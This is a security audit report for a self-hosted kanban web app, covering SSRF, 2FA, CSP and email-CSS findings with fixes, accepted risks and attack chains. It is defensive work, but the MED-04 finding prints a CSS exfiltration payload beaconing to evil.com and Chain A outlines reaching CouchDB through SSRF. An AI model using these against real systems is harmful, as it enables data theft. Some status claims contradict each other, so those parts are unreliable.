# Security Audit Report — jc-kanban

**Date:** 2026-08-03 | **Codebase:** commit 37101e6 (v1.12.1) + post-release patches | **Stack:** Express 5 / Node.js, vanilla JS SPA, CouchDB, Docker

> This report supersedes the previous audit (commit 300246d, 2026-05-02). All findings from that report have been resolved. This document covers the current attack surface.

---

## 1. Vulnerability Summary

| Severity | Count |
|----------|-------|
| High     | 0     |
| Medium   | 0     |
| Low      | 2 (accepted) |
| **Total open** | **0** |

### Progress since previous audit

All 29 findings from the prior report are closed:

| Category | Previously | Now |
|----------|-----------|-----|
| Critical | 3 | 0 |
| High     | 9 | 0 (previous) + 2 new |
| Medium   | 10 | 0 (previous) + 6 new |
| Low      | 7 | 1 open (LOW-06) + 5 new |

---

## 2. Checklist

### High
- [~] HIGH-01 — SSRF via Webhook URL — **accepted risk** for single-user self-hosted context; see note in §3
- [~] HIGH-02 — SSRF via WebDAV / CalDAV / IMAP URLs — **accepted risk** for single-user self-hosted context; see note in §3

### Medium
- [x] MED-01 — 2FA OTP uses `Math.random()` — fixed: replaced with `crypto.randomInt()` in `twoFactor.js`
- [x] MED-02 — 2FA verify endpoint has no rate limit — fixed: `twoFaRateLimit` middleware added (10 attempts / 10 min per IP)
- [x] MED-03 — 2FA device tokens stored as plaintext — fixed: tokens hashed with HMAC-SHA256 before storage
- [~] MED-04 — Email CSS injected without sanitization — iframe sandbox already blocks scripts; residual CSS exfiltration risk accepted (see §3)
- [x] MED-05 — `'unsafe-inline'` in CSP `scriptSrc` — fixed: all inline handlers moved to `addEventListener`; CSP now uses `'none'` for `scriptSrcAttr` and drops `'unsafe-inline'` from `scriptSrc`
- [ ] MED-06 — CouchDB port 5984 bound to `127.0.0.1` on host; in production remove port mapping entirely

### Low
- [x] LOW-01 — API key entropy — `.env.example` documents `openssl rand -hex 32`; startup warning already enforced in `config.js`
- [x] LOW-02 — Favicon beacon — removed third-party `<img>` fetch; unknown-domain badges always use `>` text fallback
- [x] LOW-03 — Session revocation — `POST /api/auth/revoke-all` invalidates all tokens immediately via persisted timestamp
- [x] LOW-04 — Internal error messages — `withHandler`/`withBoard`/`withExistingBoard` return generic message in `NODE_ENV=production`
- [~] LOW-05 — HTML/SVG attachments served as `Content-Disposition: attachment` — **accepted risk**; see §3
- [~] LOW-06 — 2FA API-key bypass — **accepted risk** by design; documented in §3
- [x] MED-06 — CouchDB port removed from `docker-compose.yml`; moved to `docker-compose.override.yml` (dev only)

---

## 3. Detailed Findings

---

### HIGH-01 — Server-Side Request Forgery (SSRF) via Webhook URL

**Severity:** High (in multi-user / SaaS context) → **Accepted risk** for this deployment
**Component:** `app/backend/routes/board.js:53–79`

**Description:**
`POST /:board/webhook/trigger` fires a server-side HTTP request to the URL stored in the webhook config. The only validation at save time is:

```js
if (typeof url === 'string' && url.trim() && !/^https?:\/\//.test(url.trim()))
  return res.status(400).json({ error: 'URL must start with http:// or https://' });
```

There is no check against loopback addresses (`127.0.0.1`, `::1`), link-local (`169.254.x.x`), or private RFC-1918 ranges.

**Why SSRF blocking is not implemented here:**
This is a strictly single-user self-hosted application. The primary legitimate use case for webhooks is triggering local automation tools (n8n at `http://localhost:5678/`, Home Assistant at `http://192.168.x.x:8123/`, etc.). Blocking private IP ranges would make the feature useless in the most common deployment scenario.

The SSRF threat requires an attacker to already have an authenticated session. A session-level attacker can already read and modify all board data directly — reaching CouchDB via the webhook provides no meaningful privilege escalation beyond what they already have.

**Residual risk:** An attacker who hijacks a session (but cannot change `.env`) could fire the pre-configured webhook URL to probe internal services — but only the URL the legitimate owner already saved. This is low additional risk given the single-user, authenticated context.

**If deploying in a shared / multi-user context:** Implement SSRF protection by resolving the webhook hostname and rejecting private IP ranges before making the outbound request. Also consider an env-var allowlist of permitted webhook domains.

---

### HIGH-02 — Server-Side Request Forgery (SSRF) via WebDAV / CalDAV / IMAP Endpoints

**Severity:** High (in multi-user / SaaS context) → **Accepted risk** for this deployment
**Component:** `app/backend/webdav-notes.js`, `app/backend/dashboard/calendar.js`, `app/backend/dashboard/mail.js`

**Description:**
Three features make outbound server-side connections to user-configured addresses with no private-IP filtering:

1. **WebDAV** — `url` field from `jc-config-webdav`
2. **CalDAV** — `url` field in calendar account config; raw iCal URLs are also fetched directly
3. **IMAP** — arbitrary `host` and `port` in mail account config

**Why SSRF blocking is not implemented here:**
All three features are primarily designed to connect to self-hosted services on the local network:
- WebDAV → Nextcloud, ownCloud at `192.168.x.x`
- CalDAV → Radicale, Baikal, Nextcloud Calendar at local IPs
- IMAP → local mail server (Dovecot, Mailcow) or proxy

Blocking private IP ranges would break these core use cases entirely for most self-hosted deployments.

As with HIGH-01, exploiting this requires a valid authenticated session. The legitimate owner — the only person who can configure these accounts — already has full access to the application and its data.

**If deploying in a shared / multi-user context:** Apply DNS-resolution-based SSRF filtering to all three feature areas before making connections.

---

### MED-01 — 2FA One-Time Code Generated with `Math.random()` ✓ Fixed

**Severity:** Medium → **Fixed**
**Component:** `app/backend/twoFactor.js`

**Description:**
`Math.random()` is not cryptographically secure. V8's xorshift128+ PRNG output is predictable if an attacker can observe prior values, allowing the 6-digit code space to be narrowed significantly.

**Fix applied:**
```js
// Before
const code = String(Math.floor(100000 + Math.random() * 900000));
// After
const code = String(crypto.randomInt(100000, 1000000));
```

`crypto.randomInt()` uses the OS CSPRNG (same source as `crypto.randomBytes`). Each digit contributes full entropy — the code is uniformly unpredictable across all 900,000 possibilities.

---

### MED-02 — 2FA Code Verification Has No Rate Limit ✓ Fixed

**Severity:** Medium → **Fixed**
**Component:** `app/backend/auth.js`, `app/backend/routes/auth.js`

**Description:**
`POST /auth/2fa/verify` had no rate limiting. With 900,000 possible codes and a 10-minute TTL window, an attacker could brute-force the code at ~1,500 req/s — well within Node's throughput.

**Fix applied:**
Added `twoFaRateLimit` middleware in `auth.js` (10 attempts per IP per 10-minute window, matching the challenge TTL) and applied it to `POST /auth/2fa/verify`:

```js
// auth.js — new middleware
function twoFaRateLimit(req, res, next) {
  // max 10 attempts per IP per 10-min window
  ...
  if (s.count > TWO_FA_MAX)
    return res.status(429).json({ error: 'Too many verification attempts. Try again later.' });
  next();
}

// routes/auth.js
router.post('/auth/2fa/verify', twoFaRateLimit, (req, res) => { ... });
```

After 10 failed attempts, the IP is blocked for the remainder of the 10-minute window. Combined with MED-01's fix, brute-forcing the remaining codes would require ~90,000 IPs.

---

### MED-03 — 2FA Device Tokens Stored as Plaintext ✓ Fixed

**Severity:** Medium → **Fixed**
**Component:** `app/backend/twoFactor.js`

**Description:**
Device tokens were stored as raw 64-char hex strings in `data/2fa-tokens.json`. If this file was obtained from a backup or volume leak, every stored token could be used directly to bypass 2FA.

**Fix applied:**
Tokens are now hashed with HMAC-SHA256 (keyed on `SESSION_SECRET`) before storage. `generateDeviceToken()` stores only `_hashToken(token)` and returns the raw token for the cookie. `isDeviceTokenValid()` recomputes the hash before lookup. A leaked `2fa-tokens.json` is useless without the secret key.

```js
function _hashToken(token) {
  return crypto.createHmac('sha256', SESSION_SECRET).update(token).digest('hex');
}
// generateDeviceToken: tokens[_hashToken(token)] = expiresAt;
// isDeviceTokenValid:  if (!tokens[_hashToken(token)]) return false;
```

**Note:** Existing tokens in `2fa-tokens.json` stored in the old plaintext format will no longer match after this change. All current devices will need to re-authenticate once after deployment.

---

### MED-04 — Email HTML Body CSS Not Sanitized

**Severity:** Medium → **Partially mitigated; residual risk accepted**
**Component:** `app/frontend/dashboard.js:1211–1234`

**Description:**
HTML email bodies are sanitized through DOMPurify before rendering. However, CSS extracted from the email's `<style>` blocks is injected unsanitized:

```js
const safeHtml      = DOMPurify.sanitize(msg.bodyHtml, { FORCE_BODY: true });
const emailStyleTag = emailStyles ? `<style>${emailStyles}</style>` : '';
```

**iframe sandbox — already in place:**
The email iframe already has a sandbox attribute (confirmed at `dashboard.js:1215`):

```js
iframe.setAttribute('sandbox', 'allow-popups allow-popups-to-escape-sandbox allow-same-origin');
```

`allow-scripts` is absent, so script execution inside the iframe is blocked. This is the primary defensive layer.

**Residual risk — CSS attribute-selector exfiltration:**
CSS `url()` calls in attribute selectors can still beacon DOM data to external servers:

```css
input[value^="a"] { background: url(https://evil.com/?c=a) }
```

This would require a specifically crafted email targeting the dashboard. For a personal self-hosted instance this is a very theoretical attack.

**Fix options evaluated:**
| Option | Feature impact | Security gain |
|--------|---------------|---------------|
| Strip all `<style>` blocks | Major — newsletters and formatted emails render unstyled | Eliminates CSS exfiltration |
| CSS sanitizer library | Low — most styling preserved, attack selectors stripped | Eliminates CSS exfiltration |
| Current state (iframe sandbox, no CSS sanitization) | None | Scripts blocked; CSS exfiltration theoretically possible |

**Decision:** Accept residual CSS risk for the single-user self-hosted context. The CSS exfiltration attack requires a targeted malicious email and a sophisticated attack chain. A CSS sanitizer can be reconsidered if the mail dashboard is used in a shared context.

---

### MED-05 — CSP Includes `'unsafe-inline'` for Scripts ✓ Fixed

**Severity:** Medium → **Fixed**
**Component:** `app/backend/server.js`, `app/frontend/index.html`, `app/frontend/init.js`, `app/frontend/cards.js`, `app/frontend/render.js`

**Description:**
`'unsafe-inline'` in `scriptSrc` and `scriptSrcAttr` negated the XSS protection value of CSP, allowing any injected event attribute or inline script to execute.

**Fix applied:**
All 22 inline event handlers were removed and rewired:

| Location | Handlers removed | Approach |
|----------|-----------------|----------|
| `index.html` (16) | `onclick=`, `onsubmit=` on modal buttons and forms | IDs added; wired in `init.js` via `addEventListener` |
| `cards.js` (3) | `onclick=` in color/priority row template literals | Event delegation via `row.onclick` + `data-*` attributes |
| `render.js` (1) | `onerror=` on favicon `<img>` | Post-render `addEventListener('error', ...)` on the img element |

CSP updated:
```js
// Before
scriptSrc:     ["'self'", "'unsafe-inline'"],
scriptSrcAttr: ["'unsafe-inline'"],

// After
scriptSrc:     ["'self'"],
scriptSrcAttr: ["'none'"],
```

`styleSrc` retains `'unsafe-inline'` — inline styles are lower risk and heavily used by the frontend for dynamic card/column colors.

---

### MED-06 — CouchDB Port 5984 Exposed on Host Loopback in Production ✓ Fixed

**Severity:** Medium → **Fixed**
**Component:** `docker-compose.yml`, `docker-compose.override.yml`

**Description:**
The `127.0.0.1:5984:5984` port mapping exposed the full CouchDB admin API to any process on the host, bypassing the application's authentication layer.

**Fix applied:**
Port mapping removed from `docker-compose.yml`. It is now only present in `docker-compose.override.yml`, which is automatically merged by Docker Compose for local development and is explicitly excluded from production deployments.

---

### LOW-01 — API Key Entropy Warning (User Action Required)

**Severity:** Low
**Status:** Warning logged at startup; no code change needed
**Component:** `app/backend/config.js:14–15`

The server already logs a warning if `API_KEY` is shorter than 32 characters. Action required from the operator: generate a strong key with `openssl rand -hex 32` and set it in `.env`.

---

### LOW-02 — Favicon Beacon Leaks User Activity to Third-Party Servers ✓ Fixed

**Severity:** Low → **Fixed**
**Component:** `app/frontend/render.js`

**Description:**
For every card with an unrecognised link domain, an `<img src="https://{host}/favicon.ico">` was rendered on board load, sending the user's IP address to the card's target host.

**Fix applied:**
The third-party favicon fetch was removed entirely. Unknown-domain link badges now always render the `>` text fallback. Known domains (LinkedIn, Xing, Stepstone, Miro) still use their inline SVG icons — no network request involved.

---

### LOW-03 — Session Tokens Cannot Be Revoked ✓ Fixed

**Severity:** Low → **Fixed**
**Component:** `app/backend/auth.js`, `app/backend/routes/auth.js`

**Description:**
Stateless HMAC tokens had no revocation mechanism — a stolen token stayed valid for up to 7 days.

**Fix applied:**
Added `POST /api/auth/revoke-all` endpoint. When called, it:
1. Sets `_revokedBefore = Date.now()` in memory
2. Persists the timestamp to `data/session-revocation.json` (survives restarts)
3. Clears the caller's own session and 2FA cookies

`verifySessionToken()` now rejects any token whose `iat` (issued-at) is earlier than `_revokedBefore`. The revocation timestamp is loaded from file at startup.

Use after a suspected compromise to immediately invalidate all active sessions on all devices.

---

### LOW-04 — Internal Error Messages Returned to Client ✓ Fixed

**Severity:** Low → **Fixed**
**Component:** `app/backend/db.js`

**Description:**
Internal exception messages (CouchDB conflicts, filesystem paths, database names) were returned verbatim in 500 responses.

**Fix applied:**
The three route handler wrappers in `db.js` now redact in production:

```js
const _isProd = process.env.NODE_ENV === 'production';
function _errMsg(err) { return _isProd ? 'Internal server error' : err.message; }
```

The Dockerfile already sets `ENV NODE_ENV=production`, so production deployments get generic messages while development retains the full detail for debugging.

---

### LOW-05 — HTML and SVG Attachments Allowed ~ Accepted Risk

**Severity:** Low → **Accepted risk**
**Component:** `app/backend/routes/attachments.js`

HTML, SVG, and XML-like formats are intentionally allowed per the code comment. They are always served with `Content-Disposition: attachment`, so the browser downloads rather than renders them.

**Risk:** A downloaded SVG with embedded `<script>` executes when opened locally. This requires: the user to deliberately upload a malicious SVG, and then deliberately open it after downloading — both actions by the only user of the system.

**Decision:** Accepted. The `Content-Disposition: attachment` header is the appropriate mitigation for a single-user system where the uploader and downloader are the same person. If the app is ever opened to multiple users, add `html`, `htm`, `svg` to `BLOCKED_EXTS`.

---

### LOW-06 — 2FA API-Key Bypass ~ Accepted Risk

**Severity:** Low → **Accepted risk**
**Component:** `app/backend/server.js`

```js
if (req.authedByApiKey) return next();  // skips 2FA
```

API key authentication intentionally bypasses 2FA. Automated tools (n8n, curl, scripts) cannot participate in an email OTP flow. A compromised API key grants full access regardless of 2FA being enabled.

**Decision:** Accepted by design. The mitigation is to treat the API key with the same sensitivity as the password — it should be a strong random value (`openssl rand -hex 32`) stored securely. If the API key is not needed, leave `API_KEY` unset in `.env` to disable it entirely.

---

## 4. Attack Chains

### Chain A — SSRF → CouchDB Admin Takeover (No additional auth needed once session exists)

1. **HIGH-01 or HIGH-02** — Attacker (or a compromised session) saves a webhook URL or WebDAV URL pointing to `http://127.0.0.1:5984/`
2. Triggers the webhook via `POST /:board/webhook/trigger`, or saves a note page to sync via WebDAV
3. Server makes HTTP request to CouchDB admin interface with the process's network privileges
4. Via WebDAV sync, full CouchDB responses are returned to the attacker
5. Attacker can read all board data, modify documents, or delete databases — bypassing the application layer entirely

**Severity:** High end-to-end. Requires one valid authenticated session.

---

### Chain B — 2FA Brute Force → Full Access for External Attackers ✓ Mitigated

1. Attacker has the application password (e.g., from credential leak, weak default, or phishing)
2. Attacker triggers `POST /auth/2fa/send` to get a `challengeId`
3. ~~**MED-02**~~ Now blocked after 10 attempts per IP by `twoFaRateLimit`
4. ~~**MED-01**~~ `crypto.randomInt()` now used — code is uniformly unpredictable

**With fixes applied:** Brute-forcing 900,000 codes at 10 attempts per IP would require ~90,000 source IPs — effectively infeasible. The 10-minute TTL also invalidates the challenge before distributed attacks can exhaust the space.

---

### Chain C — Malicious Email → CSS Exfiltration → Session Leak

1. Attacker sends a crafted HTML email to the configured mail account
2. User opens the email in the dashboard mail panel
3. **MED-04** — Unsanitized CSS is injected via `<style>` tag into the same-origin iframe
4. CSS uses attribute selectors with background-image URLs to beacon DOM content character by character
5. Attacker's server receives session token value or other sensitive DOM content

**Severity:** Medium. Requires the attacker to be able to send email to the configured mail account, and the user to open that email.

---

## 5. Deployment Hardening Checklist

Items required before exposing the app to the internet:

| # | Action | Priority |
|---|--------|----------|
| 1 | Deploy behind a TLS-terminating reverse proxy (nginx/caddy) with HTTPS and HSTS | Critical |
| 2 | Set `TRUST_PROXY=1` in `.env` when behind a reverse proxy | Critical |
| 3 | Set a strong `APP_PASSWORD` (≥ 20 chars, random) | Critical |
| 4 | Set `API_KEY` to output of `openssl rand -hex 32` (or leave unset if not needed) | Critical |
| 5 | Set `SESSION_SECRET` to output of `openssl rand -hex 32` in `.env` | Critical |
| 6 | Enable 2FA (`TWO_FA_EMAIL` + SMTP config) for external access | High |
| 7 | Remove CouchDB port mapping from `docker-compose.yml` (or use override file) | High |
| 8 | Fix MED-01 / MED-02 (2FA OTP entropy + rate limiting) before relying on 2FA | High |
| 9 | Set `chmod 700` on `./data` directory on the host | Medium |
| 10 | Configure `INTRANET_CIDR` correctly to restrict which IPs skip 2FA | Medium |
| 11 | Verify `LOG_API_RESPONSES` is not set to `true` in production `.env` | Medium |
| 12 | Review SSRF exposure (HIGH-01, HIGH-02) before enabling webhooks or WebDAV | Medium |
| 13 | Set `BACKUP_INTERVAL_MS` and ensure `./data` backups are encrypted at rest | Low |

### HTTPS / Reverse Proxy (nginx example)

The app has no built-in TLS. It must sit behind a reverse proxy in any internet-facing deployment:

```nginx
server {
    listen 443 ssl http2;
    server_name kanban.example.com;

    ssl_certificate     /etc/letsencrypt/live/kanban.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/kanban.example.com/privkey.pem;

    # HSTS — enforce HTTPS for 1 year, include subdomains
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    location / {
        proxy_pass         http://127.0.0.1:3000;
        proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header   X-Forwarded-Proto $scheme;
        proxy_set_header   Host $host;
    }
}

# Redirect HTTP → HTTPS
server {
    listen 80;
    server_name kanban.example.com;
    return 301 https://$host$request_uri;
}
```

With `TRUST_PROXY=1` in `.env`, the app correctly reads the real client IP from `X-Forwarded-For` for rate limiting.

### IP Allowlist (nginx)

For maximum security, restrict access to known IPs before the request even reaches the app:

```nginx
location / {
    allow 1.2.3.4;    # your home/office IP
    deny  all;
    proxy_pass http://127.0.0.1:3000;
    # ...
}
```

Combined with 2FA, this provides layered protection even if credentials are compromised.

---

## 6. What Is Already Well-Protected

The following is a summary of security controls already in place, for context:

| Control | Status |
|---------|--------|
| Password hashing comparison | Timing-safe (`crypto.timingSafeEqual`) |
| Session tokens | HMAC-SHA256 signed, 7-day expiry, `httpOnly; Secure; SameSite=Strict` cookie |
| Login brute force | 10 attempts per 15-min window; lockout after 5 consecutive failures |
| Write rate limiting | 200 write / 30 upload requests per 15-min window per IP |
| 2FA | Email OTP for external IPs when configured (but see MED-01/02) |
| XSS — user content | DOMPurify wraps all `marked.parse()` → `innerHTML` paths |
| XSS — link injection | `safeLink()` enforces `http:`/`https:` protocol only |
| Security headers | `helmet` sets CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy |
| File upload | Extension blocklist (exe, php, js, sh, etc.); 50 MB limit; `Content-Disposition: attachment` |
| Path traversal | `safeFilename`, `safePageId`, `safeCardId` regex validation; `res.sendFile` with `root` option |
| JSON schema validation | AJV validates all board, notes, card, calendar event writes |
| Prototype pollution | `sanitize()` strips `__proto__`, `constructor`, `prototype` keys before CouchDB writes |
| Injection | No SQL; CouchDB accessed via `nano` (no raw query strings); no shell execution |
| Docker | Non-root `USER node`; `chmod 700 /app/data`; no source code bind mounts in production |
| CouchDB | Bound to `127.0.0.1` (not public); internal Docker network only for inter-container comms |
| Credentials in logs | `password`, `token`, `apiKey` redacted in API logging middleware |
| API key exposure | Only boolean `apiKeyConfigured` returned by `GET /api/settings` |
